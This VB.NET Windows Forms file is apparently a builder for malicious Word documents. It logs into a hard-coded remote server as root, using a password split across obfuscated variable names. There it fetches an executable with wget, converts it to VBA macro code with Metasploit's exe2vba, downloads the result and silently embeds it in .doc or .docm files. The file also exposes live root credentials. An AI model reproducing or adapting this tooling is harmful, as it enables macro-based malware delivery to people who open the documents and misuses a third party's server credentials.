Imports Renci.SshNet
Imports System.IO
Imports Renci.SshNet.Sftp
Imports System.Runtime.InteropServices
Imports Microsoft.Office.Interop
Imports Microsoft.Vbe.Interop
Imports Word = Microsoft.Office.Interop.Word

Imports System.Reflection
Imports System.Windows.Forms.LinkLabel

Public Class Form15
    Dim fileSize As Long
    Dim vbarnd As Integer
    Dim flag As Integer
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        'Create the objects needed to make the connection'
        RichTextBox1.Text = "Please wait.."

        Dim dXNlcm As String = "t"
        Dim hbWUo As String = "uyFPnbRHj"
        Dim cGFzc3 As String = "roo"
        Dim dvcmQ As String = "ubfHWYx23"
        Dim cmVqa3dyaHdlaHI As String = cGFzc3 & dXNlcm
        Dim ZHNrbGZqc2RsZmpz As String = hbWUo & dvcmQ

        Dim connInfo As New Renci.SshNet.PasswordConnectionInfo("185.82.202.192", cmVqa3dyaHdlaHI, ZHNrbGZqc2RsZmpz)
        Dim sshClient As New Renci.SshNet.SshClient(connInfo)


        Using sshClient

            sshClient.Connect()

            Dim sc As SshCommand = sshClient.CreateCommand("cd /opt/metasploit-framework/tools/exploit && " + "wget " & TextBox1.Text + " && " + "./exe2vba.rb " & TextBox3.Text & " Z33nie" & vbarnd & ".vba")

            Try
                RichTextBox1.Text = "Generating vba.."
                sc.Execute()

            Catch ex As Exception
                flag = 1
                RichTextBox1.Text = "Error: #MF02 Try again or contact support"
            End Try

            sshClient.Disconnect()
        End Using

        If flag = 1 Then
        Else
            DownloadVBA()
            removeserverfile()
        End If

    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        If FolderBrowserDialog1.ShowDialog() = DialogResult.OK Then
            TextBox2.Text = FolderBrowserDialog1.SelectedPath
        End If
    End Sub

    Sub DownloadVBA()

        Dim dXNlcm As String = "t"
        Dim hbWUo As String = "uyFPnbRHj"
        Dim cGFzc3 As String = "roo"
        Dim dvcmQ As String = "ubfHWYx23"
        Dim cmVqa3dyaHdlaHI As String = cGFzc3 & dXNlcm
        Dim ZHNrbGZqc2RsZmpz As String = hbWUo & dvcmQ

        Try
            Using sftp As New SftpClient("185.82.202.192", 22, cmVqa3dyaHdlaHI, ZHNrbGZqc2RsZmpz)
                'connect to the server
                sftp.Connect()

                'the name of the remote file we want to transfer to the PC
                Dim remoteFileName As String = "/opt/metasploit-framework/tools/exploit/Z33nie" & vbarnd & ".vba"

                'check for existence of the file
                Dim IsExists As Boolean = sftp.Exists(remoteFileName)
                If IsExists Then
                    'get the attributes of the file (namely the size)
                    Dim att As Sftp.SftpFileAttributes = sftp.GetAttributes(remoteFileName)
                    fileSize = att.Size

                    'download the file as a memory stream and convert to a file stream
                    Using ms As New MemoryStream
                        'download as memory stream
                        'sftp.DownloadFile(remoteFileName, ms, AddressOf DownloadCallback) 'with download progress
                        'sftp.DownloadFile(remoteFileName, ms) 'without download progress

                        'here we try an asynchronous operation and wait for it to complete.
                        Dim asyncr As IAsyncResult = sftp.BeginDownloadFile(remoteFileName, ms)
                        Dim sftpAsyncr As SftpDownloadAsyncResult = CType(asyncr, SftpDownloadAsyncResult)

                        sftp.EndDownloadFile(asyncr)

                        'create a file stream
                        Dim localFileName As String = TextBox2.Text & "\" & Date.Now.ToString("yyyy-dd-MM_HHmmss") & "_Z33nie.vba"
                        Dim fs As New FileStream(localFileName, FileMode.Create, FileAccess.Write)

                        'write the memory stream to the file stream
                        ms.WriteTo(fs)

                        'close file stream
                        fs.Close()

                        'close memory stream
                        ms.Close()
                    End Using

                    'disconnect from the server
                    sftp.Disconnect()

                    'success
                    RichTextBox1.Text = "exe2vba successful! " & vbCrLf & vbCrLf & TextBox2.Text & "\" & Date.Now.ToString("yyyy-dd-MM_HHmmss") & "_Z33nie.vba"
                Else
                    RichTextBox1.Text = "Error: Something went wrong, try again or contact support #MF1"
                End If
            End Using

        Catch ex As Exception
            MsgBox(ex.ToString, MsgBoxStyle.Critical)
        Finally
            Me.Cursor = Cursors.Default
        End Try
    End Sub

    Sub removeserverfile()
        Dim dXNlcm As String = "t"
        Dim hbWUo As String = "uyFPnbRHj"
        Dim cGFzc3 As String = "roo"
        Dim dvcmQ As String = "ubfHWYx23"
        Dim cmVqa3dyaHdlaHI As String = cGFzc3 & dXNlcm
        Dim ZHNrbGZqc2RsZmpz As String = hbWUo & dvcmQ

        Dim connInfo As New Renci.SshNet.PasswordConnectionInfo("185.82.202.192", cmVqa3dyaHdlaHI, ZHNrbGZqc2RsZmpz)
        Dim sshClient As New Renci.SshNet.SshClient(connInfo)


        Using sshClient
            'connect to the server'
            sshClient.Connect()

            Dim sc As SshCommand = sshClient.CreateCommand("cd /opt/metasploit-framework/tools/exploit && " + "rm " + TextBox3.Text + " -f && " + "rm Z33nie" & vbarnd & ".vba -f")

            sc.Execute()

            sshClient.Disconnect()
        End Using
    End Sub


    Private Sub Form15_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        vbarnd = CInt(Math.Ceiling(Rnd() * 11101)) + 1

    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Dim docmsaveloc As String
        Dim mc As String = RichTextBox2.Text
        Dim pl As String = RichTextBox3.Text

        docmfile.Filter = "Word Macro-Enabled Document|*.docm"
        If docmfile.ShowDialog = System.Windows.Forms.DialogResult.OK Then
            docmsaveloc = docmfile.FileName


            Dim oWord As Word.Application = Nothing
            Dim oDocs As Word.Documents = Nothing
            Dim oDoc As Word.Document = Nothing

            oWord = New Word.Application()
            oWord.Visible = False
            oDocs = oWord.Documents
            oDoc = oDocs.Add()

            Dim objPara As Word.Paragraph
            objPara = oDoc.Content.Paragraphs.Add
            objPara.Range.Text = pl
            objPara.Format.SpaceAfter = 0
            objPara.Range.InsertParagraphAfter()

            Dim vbModule As VBComponent = oDoc.VBProject.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule)
            vbModule.Name = "AddCode"
            vbModule.CodeModule.AddFromString(mc)


            oDoc.SaveAs(docmsaveloc, Word.WdSaveFormat.wdFormatXMLDocumentMacroEnabled)
            oDoc.Close()

            oWord.Quit(False)

        Else
            MsgBox("Oops! something went wrong :(")
        End If

    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim docsaveloc As String
        Dim mc As String = RichTextBox2.Text
        Dim pl As String = RichTextBox3.Text

        docfile.Filter = "Word 97-2003 Document|*.doc"
        If docfile.ShowDialog = System.Windows.Forms.DialogResult.OK Then
            docsaveloc = docfile.FileName


            Dim ooWord As Word.Application = Nothing
            Dim ooDocs As Word.Documents = Nothing
            Dim ooDoc As Word.Document = Nothing

            ooWord = New Word.Application()
            ooWord.Visible = False
            ooDocs = ooWord.Documents
            ooDoc = ooDocs.Add()

            Dim objPara As Word.Paragraph
            objPara = ooDoc.Content.Paragraphs.Add
            objPara.Range.Text = pl
            objPara.Format.SpaceAfter = 0
            objPara.Range.InsertParagraphAfter()

            Dim vbModule As VBComponent = ooDoc.VBProject.VBComponents.Add(vbext_ComponentType.vbext_ct_StdModule)
            vbModule.Name = "AddNewCode"
            vbModule.CodeModule.AddFromString(mc)


            ooDoc.SaveAs(docsaveloc, Word.WdSaveFormat.wdFormatDocument97)
            ooDoc.Close()

            ooWord.Quit(False)
        Else
            MsgBox("Oops! something went wrong :(")
        End If
    End Sub

    Private Sub Button4_MouseHover(sender As Object, e As EventArgs) Handles Button4.MouseHover
        Button4.BackColor = Color.Gray

    End Sub

    Private Sub Button4_MouseLeave(sender As Object, e As EventArgs) Handles Button4.MouseLeave
        Button4.BackColor = Color.Black

    End Sub

    Private Sub Button1_MouseHover(sender As Object, e As EventArgs) Handles Button1.MouseHover
        Button1.BackColor = Color.DimGray

    End Sub

    Private Sub Button1_MouseLeave(sender As Object, e As EventArgs) Handles Button1.MouseLeave
        Button1.BackColor = Color.Black
    End Sub

    Private Sub Button2_MouseHover(sender As Object, e As EventArgs) Handles Button2.MouseHover
        Button2.BackColor = Color.DimGray

    End Sub

    Private Sub Button2_MouseLeave(sender As Object, e As EventArgs) Handles Button2.MouseLeave
        Button2.BackColor = Color.Black
    End Sub

    Private Sub Button3_MouseHover(sender As Object, e As EventArgs) Handles Button3.MouseHover
        Button3.BackColor = Color.DimGray
    End Sub

    Private Sub Button3_MouseLeave(sender As Object, e As EventArgs) Handles Button3.MouseLeave
        Button3.BackColor = Color.Black
    End Sub

    Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles LinkLabel1.LinkClicked
        Process.Start("https://www.youtube.com/channel/UCq2IJ1CmadzBWVFyNzZwuvg")
    End Sub
End Class